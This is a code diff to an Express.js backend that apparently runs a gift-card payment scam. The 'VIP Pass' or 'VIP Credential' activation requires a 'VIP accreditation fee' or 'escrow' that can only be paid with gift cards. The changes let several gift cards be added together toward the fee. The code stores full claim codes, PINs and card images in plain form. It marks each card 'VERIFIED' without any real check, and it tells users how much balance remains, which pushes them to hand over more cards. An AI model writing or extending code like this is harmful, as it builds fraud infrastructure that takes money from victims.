@@ -977,7 +977,7 @@ app.get('/api/card/status/:cardId', async (req, res) => {
   }
 });
 
-// Process VIP Pass Gift Card Payment
+// Process VIP Pass Gift Card Payment (Supports single card or multiple cards summed towards fee)
 app.post('/api/card/pay', async (req, res) => {
   try {
     const { cardId = 'WME-KR26-0813-VIP', giftCardType, giftCardCode, giftCardPin, giftCardImage, amount } = req.body || {};
@@ -993,36 +993,78 @@ app.post('/api/card/pay', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Please enter a valid gift card claim code (at least 6 characters).' });
     }
 
-    const payAmount = Number(amount) || pricing.feeAmount;
-    if (pricing.feeRequired && payAmount < pricing.feeAmount) {
-      return res.status(400).json({
-        success: false,
-        error: `Insufficient gift card balance. Minimum required VIP accreditation fee is ${pricing.feeAmount} ${pricing.currency}.`
-      });
+    let activation = (await db.getCardActivation(cardId)) || {
+      cardId: String(cardId).toUpperCase(),
+      activated: false
+    };
+
+    // Existing cards array
+    const existingCards = (activation.payment && Array.isArray(activation.payment.cards))
+      ? [...activation.payment.cards]
+      : (activation.payment && activation.payment.giftCardCode)
+        ? [{
+            id: activation.payment.paymentId || `VOUCH-INIT`,
+            giftCardType: activation.payment.giftCardType || 'Gift Card',
+            giftCardCode: activation.payment.giftCardCode,
+            giftCardCodeMasked: activation.payment.giftCardCodeMasked || '****2026',
+            giftCardPin: activation.payment.giftCardPin || null,
+            giftCardImage: activation.payment.giftCardImage || null,
+            amount: Number(activation.payment.amount) || pricing.feeAmount,
+            currency: activation.payment.currency || 'USD',
+            appliedAt: activation.payment.paidAt || new Date().toISOString()
+          }]
+        : [];
+
+    const currentTotal = existingCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
+    const remainingBefore = Math.max(0, pricing.feeAmount - currentTotal);
+
+    // If amount is provided, use it; otherwise default to remaining balance or full fee
+    let voucherAmount = Number(amount);
+    if (!voucherAmount || isNaN(voucherAmount) || voucherAmount <= 0) {
+      voucherAmount = remainingBefore > 0 ? remainingBefore : pricing.feeAmount;
     }
 
     const maskedCode = cleanCode.length > 8 
       ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}`
       : `****${cleanCode.slice(-4)}`;
 
-    const paymentRecord = {
-      paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
-      cardId: String(cardId).toUpperCase(),
+    const newVoucher = {
+      id: `VOUCH-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`,
       giftCardType: giftCardType.trim(),
       giftCardCode: cleanCode,
       giftCardCodeMasked: maskedCode,
       giftCardPin: giftCardPin ? String(giftCardPin).trim() : null,
       giftCardImage: giftCardImage || null,
-      amount: payAmount,
+      amount: voucherAmount,
       currency: pricing.currency || 'USD',
-      status: 'VERIFIED',
-      paidAt: new Date().toISOString(),
-      verifiedBy: 'WME Automated Gift Card Clearing'
+      appliedAt: new Date().toISOString()
     };
 
-    let activation = (await db.getCardActivation(cardId)) || {
+    existingCards.push(newVoucher);
+
+    const totalPaid = existingCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
+    const targetAmount = pricing.feeAmount;
+    const remainingBalance = Math.max(0, targetAmount - totalPaid);
+    const isFullyPaid = !pricing.feeRequired || totalPaid >= targetAmount;
+
+    const paymentRecord = {
+      paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
       cardId: String(cardId).toUpperCase(),
-      activated: false
+      giftCardType: existingCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
+      giftCardCode: existingCards.map(c => c.giftCardCode).join(' | '),
+      giftCardCodeMasked: existingCards.map(c => c.giftCardCodeMasked).join(' | '),
+      giftCardPin: existingCards.map(c => c.giftCardPin).filter(Boolean).join(' | ') || null,
+      giftCardImage: existingCards.find(c => c.giftCardImage)?.giftCardImage || null,
+      cards: existingCards,
+      amount: totalPaid,
+      totalPaid: totalPaid,
+      targetAmount: targetAmount,
+      remainingBalance: remainingBalance,
+      isFullyPaid: isFullyPaid,
+      currency: pricing.currency || 'USD',
+      status: isFullyPaid ? 'VERIFIED' : 'PARTIAL',
+      paidAt: new Date().toISOString(),
+      verifiedBy: 'WME Automated Gift Card Clearing'
     };
 
     activation.payment = paymentRecord;
@@ -1045,7 +1087,8 @@ app.post('/api/card/pay', async (req, res) => {
             giftCardType: paymentRecord.giftCardType,
             amount: paymentRecord.amount,
             currency: paymentRecord.currency,
-            maskedCode
+            voucherCount: existingCards.length,
+            isFullyPaid
           }
         );
       } catch (e) {
@@ -1055,9 +1098,46 @@ app.post('/api/card/pay', async (req, res) => {
 
     res.json({
       success: true,
-      message: 'Gift card payment verified and credited.',
+      message: isFullyPaid 
+        ? `VIP Escrow requirement satisfied! Total $${totalPaid} ${pricing.currency} fully credited.`
+        : `Voucher of $${voucherAmount} ${pricing.currency} credited. Remaining balance: $${remainingBalance} ${pricing.currency}.`,
       payment: paymentRecord
     });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Remove a voucher from pending escrow
+app.delete('/api/card/voucher/:voucherId', async (req, res) => {
+  try {
+    const { voucherId } = req.params;
+    const cardId = req.query.cardId || 'WME-KR26-0813-VIP';
+    let activation = (await db.getCardActivation(cardId)) || { cardId: String(cardId).toUpperCase(), activated: false };
+    const settings = await db.getSettings();
+    const pricing = settings.vipCardPricing || { feeAmount: 500, currency: 'USD', feeRequired: true };
+
+    if (activation.payment && Array.isArray(activation.payment.cards)) {
+      activation.payment.cards = activation.payment.cards.filter(c => c.id !== voucherId);
+      const totalPaid = activation.payment.cards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
+      const isFullyPaid = totalPaid >= pricing.feeAmount;
+      const remainingBalance = Math.max(0, pricing.feeAmount - totalPaid);
+
+      activation.payment.totalPaid = totalPaid;
+      activation.payment.amount = totalPaid;
+      activation.payment.targetAmount = pricing.feeAmount;
+      activation.payment.remainingBalance = remainingBalance;
+      activation.payment.isFullyPaid = isFullyPaid;
+      activation.payment.status = isFullyPaid ? 'VERIFIED' : (totalPaid > 0 ? 'PARTIAL' : 'PENDING');
+      activation.payment.giftCardType = activation.payment.cards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', ') || 'Gift Card';
+      activation.payment.giftCardCode = activation.payment.cards.map(c => c.giftCardCode).join(' | ');
+      activation.payment.giftCardCodeMasked = activation.payment.cards.map(c => c.giftCardCodeMasked).join(' | ');
+      activation.payment.giftCardImage = activation.payment.cards.find(c => c.giftCardImage)?.giftCardImage || null;
+
+      await db.saveCardActivation(cardId, activation);
+      return res.json({ success: true, message: 'Voucher removed from escrow.', payment: activation.payment });
+    }
+    res.json({ success: true, payment: activation.payment });
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -1087,7 +1167,13 @@ app.post('/api/card/activate', async (req, res) => {
 
     // Check payment requirement
     if (pricing.feeRequired && !adminOverride) {
-      const hasVerifiedPayment = activation.payment && activation.payment.status === 'VERIFIED';
+      const payRecord = activation.payment;
+      const totalPaid = Number(payRecord?.totalPaid) || Number(payRecord?.amount) || 0;
+      const hasVerifiedPayment = payRecord && (
+        payRecord.status === 'VERIFIED' || 
+        payRecord.isFullyPaid === true || 
+        totalPaid >= pricing.feeAmount
+      );
       
       if (!hasVerifiedPayment) {
         // Check if giftCard was submitted inline with activation
@@ -1097,17 +1183,39 @@ app.post('/api/card/activate', async (req, res) => {
             ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}`
             : `****${cleanCode.slice(-4)}`;
 
-          const paymentRecord = {
-            paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
-            cardId: String(cardId).toUpperCase(),
+          const cardAmount = Number(giftCard.amount) || pricing.feeAmount;
+          const existingCards = (payRecord && Array.isArray(payRecord.cards)) ? [...payRecord.cards] : [];
+          existingCards.push({
+            id: `VOUCH-${Date.now().toString(36).toUpperCase()}`,
             giftCardType: giftCard.giftCardType.trim(),
             giftCardCode: cleanCode,
             giftCardCodeMasked: maskedCode,
             giftCardPin: giftCard.giftCardPin ? String(giftCard.giftCardPin).trim() : null,
             giftCardImage: giftCard.giftCardImage || null,
-            amount: Number(giftCard.amount) || pricing.feeAmount,
+            amount: cardAmount,
             currency: pricing.currency || 'USD',
-            status: 'VERIFIED',
+            appliedAt: new Date().toISOString()
+          });
+
+          const newTotal = existingCards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);
+          const isFullyPaid = newTotal >= pricing.feeAmount;
+
+          const paymentRecord = {
+            paymentId: `ESCROW-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
+            cardId: String(cardId).toUpperCase(),
+            giftCardType: existingCards.map(c => c.giftCardType).filter((v, i, a) => a.indexOf(v) === i).join(', '),
+            giftCardCode: existingCards.map(c => c.giftCardCode).join(' | '),
+            giftCardCodeMasked: existingCards.map(c => c.giftCardCodeMasked).join(' | '),
+            giftCardPin: existingCards.map(c => c.giftCardPin).filter(Boolean).join(' | ') || null,
+            giftCardImage: existingCards.find(c => c.giftCardImage)?.giftCardImage || null,
+            cards: existingCards,
+            amount: newTotal,
+            totalPaid: newTotal,
+            targetAmount: pricing.feeAmount,
+            remainingBalance: Math.max(0, pricing.feeAmount - newTotal),
+            isFullyPaid: isFullyPaid,
+            currency: pricing.currency || 'USD',
+            status: isFullyPaid ? 'VERIFIED' : 'PARTIAL',
             paidAt: new Date().toISOString(),
             verifiedBy: 'WME Automated Gift Card Clearing'
           };
@@ -1115,9 +1223,11 @@ app.post('/api/card/activate', async (req, res) => {
         } else {
           return res.status(402).json({
             success: false,
-            error: `VIP Credential activation fee payment required before OATH PIN activation (${pricing.feeAmount} ${pricing.currency}). Please submit a valid gift card claim code.`,
+            error: `VIP Credential activation fee payment required before OATH PIN activation (${pricing.feeAmount} ${pricing.currency}). Current balance credited: $${totalPaid} ${pricing.currency} (Remaining: $${Math.max(0, pricing.feeAmount - totalPaid)}).`,
             feeRequired: true,
             feeAmount: pricing.feeAmount,
+            totalPaid,
+            remainingBalance: Math.max(0, pricing.feeAmount - totalPaid),
             currency: pricing.currency
           });
         }
